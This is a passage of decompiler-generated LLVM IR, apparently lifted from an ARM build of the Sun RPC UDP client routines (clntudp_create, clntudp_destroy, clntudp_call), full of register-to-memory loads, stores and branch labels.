  store i32 %v0_1686c, i32* %r0.global-to-local, align 4
  %v0_16880 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_1688c = call i32 @pmap_getport(i32 %v0_1686c, i32 %v0_16880, i32 %arg3, i32 17)
  store i32 %v4_1688c, i32* %r0.global-to-local, align 4
  %v2_16890 = icmp eq i32 %v4_1688c, 0
  br i1 %v2_16890, label %dec_label_pc_169f8, label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %dec_label_pc_1687c
  %v3_16898 = udiv i32 %v4_1688c, 256
  %v1_1689c = urem i32 %v4_1688c, 256
  %v1_168a0 = urem i32 %v3_16898, 256
  %v4_168a4 = mul nuw nsw i32 %v1_1689c, 256
  %v5_168a4 = or i32 %v4_168a4, %v1_168a0
  store i32 %v5_168a4, i32* %r3.global-to-local, align 4
  store i32 %v1_1689c, i32* %r2.global-to-local, align 4
  %v1_168ac = trunc i32 %v4_1688c to i8
  %v2_168ac = load i32, i32* @r4, align 4
  %v3_168ac = add i32 %v2_168ac, 3
  %v4_168ac = inttoptr i32 %v3_168ac to i8*
  store i8 %v1_168ac, i8* %v4_168ac, align 1
  %v0_168b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_168b0 = trunc i32 %v0_168b0 to i8
  %v2_168b0 = load i32, i32* @r4, align 4
  %v3_168b0 = add i32 %v2_168b0, 2
  %v4_168b0 = inttoptr i32 %v3_168b0 to i8*
  store i8 %v1_168b0, i8* %v4_168b0, align 1
  br label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_16860, %dec_label_pc_16898
  store i32 ptrtoint (i32* @global_var_2b8a4.863 to i32), i32* %r3.global-to-local, align 4
  %v0_168b8 = load i32, i32* @r6, align 4
  %v1_168b8 = add i32 %v0_168b8, 4
  %v2_168b8 = inttoptr i32 %v1_168b8 to i32*
  store i32 ptrtoint (i32* @global_var_2b8a4.863 to i32), i32* %v2_168b8, align 4
  %v4_168b8 = add i32 %v0_168b8, 8
  %v5_168b8 = inttoptr i32 %v4_168b8 to i32*
  %v6_168b8 = load i32, i32* @r5, align 4
  store i32 %v6_168b8, i32* %v5_168b8, align 4
  %v0_168bc = load i32, i32* @r4, align 4
  %v1_168bc = inttoptr i32 %v0_168bc to i32*
  %v2_168bc = load i32, i32* %v1_168bc, align 4
  store i32 %v2_168bc, i32* %r0.global-to-local, align 4
  %v3_168bc = add i32 %v0_168bc, 4
  %v4_168bc = inttoptr i32 %v3_168bc to i32*
  %v5_168bc = load i32, i32* %v4_168bc, align 4
  %v6_168bc = add i32 %v0_168bc, 8
  %v7_168bc = inttoptr i32 %v6_168bc to i32*
  %v8_168bc = load i32, i32* %v7_168bc, align 4
  store i32 %v8_168bc, i32* %r2.global-to-local, align 4
  %v9_168bc = add i32 %v0_168bc, 12
  %v10_168bc = inttoptr i32 %v9_168bc to i32*
  %v11_168bc = load i32, i32* %v10_168bc, align 4
  store i32 %v11_168bc, i32* %r3.global-to-local, align 4
  %v0_168c0 = load i32, i32* @r5, align 4
  %v1_168c0 = add i32 %v0_168c0, 8
  %v1_168c4 = inttoptr i32 %v1_168c0 to i32*
  store i32 %v2_168bc, i32* %v1_168c4, align 4
  %v3_168c4 = add i32 %v0_168c0, 12
  %v4_168c4 = inttoptr i32 %v3_168c4 to i32*
  store i32 %v5_168bc, i32* %v4_168c4, align 4
  %v6_168c4 = add i32 %v0_168c0, 16
  %v7_168c4 = inttoptr i32 %v6_168c4 to i32*
  %v8_168c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_168c4, i32* %v7_168c4, align 4
  %v9_168c4 = add i32 %v0_168c0, 20
  %v10_168c4 = inttoptr i32 %v9_168c4 to i32*
  %v11_168c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_168c4, i32* %v10_168c4, align 4
  %v1_168cc = load i32, i32* @r5, align 4
  %v2_168cc = add i32 %v1_168cc, 24
  %v3_168cc = inttoptr i32 %v2_168cc to i32*
  store i32 16, i32* %v3_168cc, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  %v1_168d8 = load i32, i32* @r5, align 4
  %v2_168d8 = add i32 %v1_168d8, 40
  %v3_168d8 = inttoptr i32 %v2_168d8 to i32*
  store i32 -1, i32* %v3_168d8, align 4
  %v1_168dc = load i32, i32* @r5, align 4
  %v2_168dc = add i32 %v1_168dc, 28
  %v3_168dc = inttoptr i32 %v2_168dc to i32*
  store i32 %arg4, i32* %v3_168dc, align 4
  %v0_168e0 = load i32, i32* @r7, align 4
  %v1_168e0 = load i32, i32* @r5, align 4
  %v2_168e0 = add i32 %v1_168e0, 92
  %v3_168e0 = inttoptr i32 %v2_168e0 to i32*
  store i32 %v0_168e0, i32* %v3_168e0, align 4
  %v3_168e4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_168e4, i32* %r3.global-to-local, align 4
  %v0_168e8 = load i32, i32* @lr, align 4
  %v1_168e8 = load i32, i32* @r5, align 4
  %v2_168e8 = add i32 %v1_168e8, 36
  %v3_168e8 = inttoptr i32 %v2_168e8 to i32*
  store i32 %v0_168e8, i32* %v3_168e8, align 4
  %v1_168ec = load i32, i32* @r5, align 4
  %v2_168ec = add i32 %v1_168ec, 32
  %v3_168ec = inttoptr i32 %v2_168ec to i32*
  store i32 %v3_168e4, i32* %v3_168ec, align 4
  %v0_168f0 = load i32, i32* @r8, align 4
  %v1_168f0 = load i32, i32* @r5, align 4
  %v2_168f0 = add i32 %v1_168f0, 84
  %v3_168f0 = inttoptr i32 %v2_168f0 to i32*
  store i32 %v0_168f0, i32* %v3_168f0, align 4
  %v4_168f4 = call i32 @_create_xid(i32 %v2_168bc, i32 %v5_168bc, i32 %arg4, i32 %v3_168e4)
  store i32 %v4_168f4, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r7, align 4
  store i32 %v4_168f4, i32* %stack_var_-96, align 4
  %v0_16908 = load i32, i32* @fp, align 4
  %v0_1690c = load i32, i32* @sl, align 4
  %v0_16914 = load i32, i32* @r5, align 4
  %v1_16914 = add i32 %v0_16914, 56
  store i32 %v1_16914, i32* @r4, align 4
  %v0_16918 = load i32, i32* @r8, align 4
  store i32 %v0_16918, i32* %r2.global-to-local, align 4
  %v1_1691c = add i32 %v0_16914, 88
  %v2_1691c = inttoptr i32 %v1_1691c to i32*
  %v3_1691c = load i32, i32* %v2_1691c, align 4
  store i32 %v0_1690c, i32* %r3.global-to-local, align 4
  store i32 %v1_16914, i32* %r0.global-to-local, align 4
  %v9_16928 = inttoptr i32 %v1_16914 to i32*
  %v10_16928 = call i32 @__GI_xdrmem_create(i32* %v9_16928, i32 %v3_1691c, i32 %v0_16918, i32 %v0_1690c, i32 %v4_168f4, i32 %v0_1690c, i32 2, i32 %v0_16908, i32 %arg3)
  %v0_1692c = load i32, i32* @r4, align 4
  store i32 %v0_1692c, i32* %r0.global-to-local, align 4
  %v2_16930 = ptrtoint i32* %stack_var_-96 to i32
  %v2_16934 = inttoptr i32 %v0_1692c to i32*
  %v3_16934 = call i32 @__GI_xdr_callhdr(i32* %v2_16934, i32 %v2_16930)
  store i32 %v3_16934, i32* %r0.global-to-local, align 4
  %v2_16938 = icmp eq i32 %v3_16934, 0
  br i1 %v2_16938, label %dec_label_pc_169f8, label %dec_label_pc_16940

dec_label_pc_16940:                               ; preds = %dec_label_pc_168b4
  %v0_16940 = load i32, i32* @r5, align 4
  %v1_16940 = add i32 %v0_16940, 60
  %v2_16940 = inttoptr i32 %v1_16940 to i32*
  %v3_16940 = load i32, i32* %v2_16940, align 4
  store i32 %v3_16940, i32* %r3.global-to-local, align 4
  %v0_16944 = load i32, i32* @r4, align 4
  store i32 %v0_16944, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16950.864 to i32), i32* @lr, align 4
  %v1_1694c = add i32 %v3_16940, 16
  %v2_1694c = inttoptr i32 %v1_1694c to i32*
  %v3_1694c = load i32, i32* %v2_1694c, align 4
  call void @__pseudo_branch(i32 %v3_1694c)
  %v0_16950 = load i32, i32* %r0.global-to-local, align 4
  %v1_16950 = load i32, i32* @r5, align 4
  %v2_16950 = add i32 %v1_16950, 80
  %v3_16950 = inttoptr i32 %v2_16950 to i32*
  store i32 %v0_16950, i32* %v3_16950, align 4
  %v0_16954 = load i32, i32* @sb, align 4
  %v1_16954 = inttoptr i32 %v0_16954 to i32*
  %v2_16954 = load i32, i32* %v1_16954, align 4
  store i32 %v2_16954, i32* %r3.global-to-local, align 4
  %v1_16958 = icmp slt i32 %v2_16954, 0
  br i1 %v1_16958, label %dec_label_pc_16964, label %bb31

bb31:                                             ; preds = %dec_label_pc_16940
  %v3_1695c = load i32, i32* @sl, align 4
  %v4_1695c = load i32, i32* @r5, align 4
  %v5_1695c = add i32 %v4_1695c, 4
  %v6_1695c = inttoptr i32 %v5_1695c to i32*
  store i32 %v3_1695c, i32* %v6_1695c, align 4
  br label %dec_label_pc_169e4

dec_label_pc_16964:                               ; preds = %dec_label_pc_16940
  %v0_16964 = load i32, i32* @r7, align 4
  store i32 %v0_16964, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v0_16978 = call i32 @socket()
  store i32 %v0_16978, i32* %r0.global-to-local, align 4
  %v1_1697c = icmp slt i32 %v0_16978, 0
  %v1_16980 = load i32, i32* @sb, align 4
  %v2_16980 = inttoptr i32 %v1_16980 to i32*
  store i32 %v0_16978, i32* %v2_16980, align 4
  br i1 %v1_1697c, label %dec_label_pc_16988, label %dec_label_pc_169a8

dec_label_pc_16988:                               ; preds = %dec_label_pc_16964
  %v0_16988 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_16988, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16990 = inttoptr i32 %v0_16988 to i32*
  store i32 12, i32* %v2_16990, align 4
  store i32 %v0_16988, i32* @r4, align 4
  %v0_16998 = call i32 @__errno_location()
  store i32 %v0_16998, i32* %r0.global-to-local, align 4
  %v1_1699c = inttoptr i32 %v0_16998 to i32*
  %v2_1699c = load i32, i32* %v1_1699c, align 4
  store i32 %v2_1699c, i32* %r3.global-to-local, align 4
  %v1_169a0 = load i32, i32* @r4, align 4
  %v2_169a0 = add i32 %v1_169a0, 8
  %v3_169a0 = inttoptr i32 %v2_169a0 to i32*
  store i32 %v2_1699c, i32* %v3_169a0, align 4
  br label %dec_label_pc_169f8

dec_label_pc_169a8:                               ; preds = %dec_label_pc_16964
  %v0_169a8 = load i32, i32* @sl, align 4
  %v2_169ac = inttoptr i32 %v0_169a8 to i8*
  %v3_169ac = call i32 @__GI_bindresvport(i32 %v0_16978, i8* %v2_169ac)
  store i32 %v3_169ac, i32* %r0.global-to-local, align 4
  %v2_169b4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_169b4, i32* %r2.global-to-local, align 4
  %v0_169b8 = load i32, i32* @sb, align 4
  %v1_169b8 = inttoptr i32 %v0_169b8 to i32*
  %v2_169b8 = load i32, i32* %v1_169b8, align 4
  store i32 %v2_169b8, i32* @r0, align 4
  %v4_169bc = call i32 @ioctl(i32 %v2_169b8, i32 21537, i32 %v2_169b4)
  store i32 %v4_169bc, i32* %r0.global-to-local, align 4
  %v0_169c0 = load i32, i32* @sb, align 4
  %v1_169c0 = inttoptr i32 %v0_169c0 to i32*
  %v2_169c0 = load i32, i32* %v1_169c0, align 4
  store i32 %v2_169c0, i32* %r0.global-to-local, align 4
  %v0_169c8 = load i32, i32* @sl, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v2_169d0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_169d0, i32* %r3.global-to-local, align 4
  %v0_169d8 = load i32, i32* @r4, align 4
  store i32 %v0_169d8, i32* %stack_var_-48, align 4
  %v6_169dc = call i32 @__GI_setsockopt(i32 %v2_169c0, i32 %v0_169c8, i32 11, i32* nonnull %stack_var_-48, i32 4)
  store i32 %v6_169dc, i32* %r0.global-to-local, align 4
  %v0_169e0 = load i32, i32* @r4, align 4
  %v1_169e0 = load i32, i32* @r5, align 4
  %v2_169e0 = add i32 %v1_169e0, 4
  %v3_169e0 = inttoptr i32 %v2_169e0 to i32*
  store i32 %v0_169e0, i32* %v3_169e0, align 4
  br label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %bb31, %dec_label_pc_169a8
  %v0_169e4 = load i32, i32* @sb, align 4
  %v1_169e4 = inttoptr i32 %v0_169e4 to i32*
  %v2_169e4 = load i32, i32* %v1_169e4, align 4
  store i32 %v2_169e4, i32* %r3.global-to-local, align 4
  %v1_169e8 = load i32, i32* @r5, align 4
  %v2_169e8 = inttoptr i32 %v1_169e8 to i32*
  store i32 %v2_169e4, i32* %v2_169e8, align 4
  %v0_169ec = call i32 @authnone_create()
  store i32 %v0_169ec, i32* %r0.global-to-local, align 4
  %v1_169f0 = load i32, i32* @r6, align 4
  %v2_169f0 = inttoptr i32 %v1_169f0 to i32*
  store i32 %v0_169ec, i32* %v2_169f0, align 4
  %v0_16a18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16a18

dec_label_pc_169f8:                               ; preds = %dec_label_pc_168b4, %dec_label_pc_1687c, %dec_label_pc_16988, %dec_label_pc_16838
  %v0_169f8 = load i32, i32* @r5, align 4
  %v2_169f8 = icmp eq i32 %v0_169f8, 0
  br i1 %v2_169f8, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_169f8
  store i32 %v0_169f8, i32* %r0.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_169f8, %bb32
  store i32 92676, i32* @lr, align 4
  %v1_16a00 = xor i1 %v2_169f8, true
  call void @__pseudo_cond_branch(i1 %v1_16a00, i32 ptrtoint (i32* @global_var_134b0.563 to i32))
  %v0_16a04 = load i32, i32* @r6, align 4
  %v2_16a04 = icmp eq i32 %v0_16a04, 0
  br i1 %v2_16a04, label %dec_label_pc_16a18, label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %bb33
  store i32 %v0_16a04, i32* @r0, align 4
  %v0_16a10 = call i32 @free()
  store i32 %v0_16a10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a18

dec_label_pc_16a18:                               ; preds = %bb33, %dec_label_pc_169e4, %dec_label_pc_16a0c
  %v0_16a18 = phi i32 [ 0, %bb33 ], [ %v0_16a18.pre, %dec_label_pc_169e4 ], [ 0, %dec_label_pc_16a0c ]
  store i32 %v0_16a18, i32* %r0.global-to-local, align 4
  store i32 %v6_167d4, i32* @r5, align 4
  store i32 %v9_167d4, i32* @r6, align 4
  store i32 %v12_167d4, i32* @r7, align 4
  store i32 %v15_167d4, i32* @r8, align 4
  store i32 %v18_167d4, i32* @sb, align 4
  store i32 %v21_167d4, i32* @sl, align 4
  store i32 %v24_167d4, i32* @fp, align 4
  store i32 %v27_167d4, i32* @lr, align 4
  ret i32 %v0_16a18

; uselistorder directives
  uselistorder i32 %v0_16a18, { 1, 0 }
  uselistorder i32 %v1_16914, { 1, 0, 2 }
  uselistorder i32 %v0_1690c, { 2, 1, 0 }
  uselistorder i32 %v1_1689c, { 1, 0 }
  uselistorder i32 %v4_1688c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1686c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1681c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 6, 5, 7, 8, 9, 10, 14, 11, 12, 13, 15, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 26, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @__GI_setsockopt, { 3, 0, 1, 2 }
  uselistorder i32 84, { 8, 0, 5, 6, 1, 2, 3, 4, 7 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16a18, { 2, 0, 1 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_169f8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_169e4, { 1, 0 }
  uselistorder label %dec_label_pc_168b4, { 1, 0 }
  uselistorder label %dec_label_pc_16838, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v3_16a40 = load i32, i32* @r4, align 4
  %v6_16a40 = load i32, i32* @r5, align 4
  %v9_16a40 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 8800, i32* @lr, align 4
  %v1_16a70 = load i32, i32* @r1, align 4
  %v2_16a70 = load i32, i32* @r2, align 4
  %v8_16a70 = inttoptr i32 %arg1 to i32*
  %v9_16a70 = call i32 @__GI_clntudp_bufcreate(i32* %v8_16a70, i32 %v1_16a70, i32 %v2_16a70, i32 %arg2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_16a40, i32* @r4, align 4
  store i32 %v6_16a40, i32* @r5, align 4
  store i32 %v9_16a40, i32* @lr, align 4
  ret i32 %v9_16a70

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_16a88 = load i32, i32* @r4, align 4
  store i32 %v3_16a88, i32* %stack_var_-12, align 4
  %v6_16a88 = load i32, i32* @r5, align 4
  %v9_16a88 = load i32, i32* @lr, align 4
  %v1_16a8c = add i32 %arg1, 8
  %v2_16a8c = inttoptr i32 %v1_16a8c to i32*
  %v3_16a8c = load i32, i32* %v2_16a8c, align 4
  store i32 %v3_16a8c, i32* @r4, align 4
  %v1_16a90 = add i32 %v3_16a8c, 4
  %v2_16a90 = inttoptr i32 %v1_16a90 to i32*
  %v3_16a90 = load i32, i32* %v2_16a90, align 4
  %v2_16a94 = icmp eq i32 %v3_16a90, 0
  store i32 %arg1, i32* @r5, align 4
  br i1 %v2_16a94, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  store i32 92836, i32* @lr, align 4
  %v1_16aa0 = xor i1 %v2_16a94, true
  call void @__pseudo_cond_branch(i1 %v1_16aa0, i32 ptrtoint (i32* @global_var_10014.867 to i32))
  %v0_16aa4 = load i32, i32* @r4, align 4
  %v1_16aa4 = add i32 %v0_16aa4, 60
  %v2_16aa4 = inttoptr i32 %v1_16aa4 to i32*
  %v3_16aa4 = load i32, i32* %v2_16aa4, align 4
  %v1_16aa8 = add i32 %v3_16aa4, 28
  %v2_16aa8 = inttoptr i32 %v1_16aa8 to i32*
  %v3_16aa8 = load i32, i32* %v2_16aa8, align 4
  %v2_16aac = icmp eq i32 %v3_16aa8, 0
  br i1 %v2_16aac, label %.thread, label %bb6

bb6:                                              ; preds = %bb5
  store i32 92860, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_16aa8)
  %v0_16abc.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %bb5, %bb6
  %v0_16abc = phi i32 [ %v0_16aa4, %bb5 ], [ %v0_16abc.pre, %bb6 ]
  store i32 %v0_16abc, i32* @r0, align 4
  %v0_16ac0 = call i32 @free()
  %v0_16ac4 = load i32, i32* @r5, align 4
  store i32 %v0_16ac4, i32* @r0, align 4
  %v2_16ac8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ac8, i32* @r4, align 4
  store i32 %v6_16a88, i32* @r5, align 4
  store i32 %v9_16a88, i32* @lr, align 4
  %v0_16acc = call i32 @free()
  ret i32 %v0_16acc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp57 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-144 = alloca i8, align 1
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-9008 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-8196 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_16ad4 = load i32, i32* @r4, align 4
  store i32 %v3_16ad4, i32* %stack_var_-44, align 4
  %v34_16ad4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_16ae4 = ptrtoint i32* %stack_var_-8196 to i32
  store i32 %v34_16ad4, i32* %ip.global-to-local, align 4
  %v3_16af4 = add i32 %v34_16ad4, -8968
  %v4_16af4 = inttoptr i32 %v3_16af4 to i32*
  store i32 %arg2, i32* %v4_16af4, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v1_16b00 = add i32 %tmp, 8
  %v2_16b00 = inttoptr i32 %v1_16b00 to i32*
  %v3_16b00 = load i32, i32* %v2_16b00, align 4
  store i32 %v3_16b00, i32* @r6, align 4
  %v1_16b04 = add i32 %v3_16b00, 28
  %v2_16b04 = inttoptr i32 %v1_16b04 to i32*
  %v3_16b04 = load i32, i32* %v2_16b04, align 4
  %v2_16b0c = mul i32 %v3_16b04, 1000
  store i32 %v2_16ae4, i32* %ip.global-to-local, align 4
  %v1_16b18 = add i32 %v3_16b00, 32
  %v2_16b18 = inttoptr i32 %v1_16b18 to i32*
  %v3_16b18 = load i32, i32* %v2_16b18, align 4
  %v2_16b24 = sdiv i32 %v3_16b18, 1000
  store i32 %v2_16b24, i32* %r0.global-to-local, align 4
  %v1_16b28 = add i32 %v3_16b00, 40
  %v2_16b28 = inttoptr i32 %v1_16b28 to i32*
  %v3_16b28 = load i32, i32* %v2_16b28, align 4
  %v2_16b2c = add i32 %v2_16b24, %v2_16b0c
  store i32 %v2_16b2c, i32* %ip.global-to-local, align 4
  %v3_16b34 = icmp eq i32 %v3_16b28, -1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %arg8, i32* @r4, align 4
  br i1 %v3_16b34, label %dec_label_pc_16b48, label %dec_label_pc_16b8c

dec_label_pc_16b48:                               ; preds = %entry
  store i32 %v2_16ae4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b9c

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16c7c
  %v0_16b58 = call i32 @__errno_location()
  store i32 %v0_16b58, i32* %r0.global-to-local, align 4
  %phitmp = inttoptr i32 %v0_16b58 to i32*
  %storemerge5 = load i32, i32* %phitmp, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %ip.global-to-local, align 4
  %v1_16b84 = load i32, i32* @r6, align 4
  %v2_16b84 = add i32 %v1_16b84, 48
  %v3_16b84 = inttoptr i32 %v2_16b84 to i32*
  store i32 %storemerge5, i32* %v3_16b84, align 4
  br label %dec_label_pc_16b70

dec_label_pc_16b68:                               ; preds = %dec_label_pc_16e54, %dec_label_pc_16e50, %dec_label_pc_16cb8
  store i32 5, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b6c

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16dc8, %dec_label_pc_16c60, %dec_label_pc_16b68
  %v0_16b6c = phi i32 [ 4, %dec_label_pc_16dc8 ], [ 1, %dec_label_pc_16c60 ], [ 5, %dec_label_pc_16b68 ]
  store i32 %v0_16b6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16b70

dec_label_pc_16b70:                               ; preds = %dec_label_pc_17044, %dec_label_pc_16b58, %dec_label_pc_16b6c
  %v0_16b70 = load i32, i32* %r3.global-to-local, align 4
  %v1_16b70 = load i32, i32* @r6, align 4
  %v2_16b70 = add i32 %v1_16b70, 44
  %v3_16b70 = inttoptr i32 %v2_16b70 to i32*
  store i32 %v0_16b70, i32* %v3_16b70, align 4
  %v0_1717c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1717c

dec_label_pc_16b8c:                               ; preds = %entry
  %v1_16b8c = add i32 %v3_16b00, 36
  %v2_16b8c = inttoptr i32 %v1_16b8c to i32*
  %v3_16b8c = load i32, i32* %v2_16b8c, align 4
  store i32 %v3_16b8c, i32* %ip.global-to-local, align 4
  store i32 %v2_16ae4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b9c

dec_label_pc_16b9c:                               ; preds = %dec_label_pc_16b48, %dec_label_pc_16b8c
  %storemerge6 = phi i32 [ %v3_16b28, %dec_label_pc_16b8c ], [ %arg8, %dec_label_pc_16b48 ]
  %storemerge7 = phi i32 [ %v3_16b8c, %dec_label_pc_16b8c ], [ %arg7, %dec_label_pc_16b48 ]
  store i32 0, i32* %sb.global-to-local, align 4
  %v2_16bbc = icmp eq i32 %arg3, 0
  %v2_16cd0 = ptrtoint i32* %stack_var_-196 to i32
  %v2_16d04 = ptrtoint i32* %stack_var_-56 to i32
  %v3_16d10 = bitcast i32* %stack_var_-56 to %pollfd*
  %v4_16e78 = zext i8 %tmp57 to i32
  %v1_16e7c = and i32 %v4_16e78, 8
  %v2_16e7c = icmp eq i32 %v1_16e7c, 0
  %v2_16ff4 = ptrtoint i32* %stack_var_-88 to i32
  %v2_17010 = ptrtoint i32* %stack_var_-48 to i32
  %v2_16e98 = ptrtoint i8* %stack_var_-104 to i32
  %v2_16eb8 = ptrtoint i32* %stack_var_-9008 to i32
  %v2_16d40 = ptrtoint i8** %stack_var_-72 to i32
  %v2_16dbc = ptrtoint i32* %stack_var_-160 to i32
  %v13_16d70 = ptrtoint i8* %stack_var_-144 to i32
  %v2_17080 = ptrtoint i32* %stack_var_-128 to i32
  %v2_17094 = ptrtoint i32* %stack_var_-208 to i32
  %v2_16cb0 = icmp eq i32 %storemerge7, 0
  %v2_16cc0 = icmp eq i32 %storemerge6, 0
  %v3_16ea8 = add i32 %v34_16ad4, -8964
  %v4_16ea8 = inttoptr i32 %v3_16ea8 to i32*
  br label %dec_label_pc_16bb4

dec_label_pc_16bb4:                               ; preds = %dec_label_pc_17158, %dec_label_pc_16b9c
  %v1_16bcc = phi i32 [ %v3_16b00, %dec_label_pc_16b9c ], [ %v0_16bc0.pre, %dec_label_pc_17158 ]
  %stack_var_-9024.0 = phi i32 [ 0, %dec_label_pc_16b9c ], [ %stack_var_-9024.2, %dec_label_pc_17158 ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_16b9c ], [ %stack_var_-9028.2, %dec_label_pc_17158 ]
  %stack_var_-9032.0 = phi i32 [ 2, %dec_label_pc_16b9c ], [ %v1_17160, %dec_label_pc_17158 ]
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v1_16bc0 = add i32 %v1_16bcc, 56
  store i32 %v1_16bc0, i32* @r8, align 4
  br i1 %v2_16bbc, label %dec_label_pc_16cc8, label %dec_label_pc_16bc8

dec_label_pc_16bc8:                               ; preds = %dec_label_pc_16bb4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_16bcc = inttoptr i32 %v1_16bc0 to i32*
  store i32 0, i32* %v3_16bcc, align 4
  %v0_16bd4 = load i32, i32* @r8, align 4
  %v1_16bd4 = add i32 %v0_16bd4, 4
  %v2_16bd4 = inttoptr i32 %v1_16bd4 to i32*
  %v3_16bd4 = load i32, i32* %v2_16bd4, align 4
  store i32 %v3_16bd4, i32* %r3.global-to-local, align 4
  store i32 %v0_16bd4, i32* %r0.global-to-local, align 4
  %v1_16be0 = add i32 %v3_16bd4, 20
  %v2_16be0 = inttoptr i32 %v1_16be0 to i32*
  %v3_16be0 = load i32, i32* %v2_16be0, align 4
  call void @__pseudo_branch(i32 %v3_16be0)
  %v0_16be4 = load i32, i32* @r6, align 4
  %v1_16be4 = add i32 %v0_16be4, 88
  %v2_16be4 = inttoptr i32 %v1_16be4 to i32*
  %v3_16be4 = load i32, i32* %v2_16be4, align 4
  %v1_16be8 = inttoptr i32 %v3_16be4 to i32*
  %v2_16be8 = load i32, i32* %v1_16be8, align 4
  %v1_16bec = add i32 %v2_16be8, 1
  store i32 %v1_16bec, i32* %r3.global-to-local, align 4
  store i32 %v1_16bec, i32* %v1_16be8, align 4
  %v0_16c00 = load i32, i32* @r8, align 4
  %v1_16c00 = add i32 %v0_16c00, 4
  %v2_16c00 = inttoptr i32 %v1_16c00 to i32*
  %v3_16c00 = load i32, i32* %v2_16c00, align 4
  store i32 %v3_16c00, i32* %r3.global-to-local, align 4
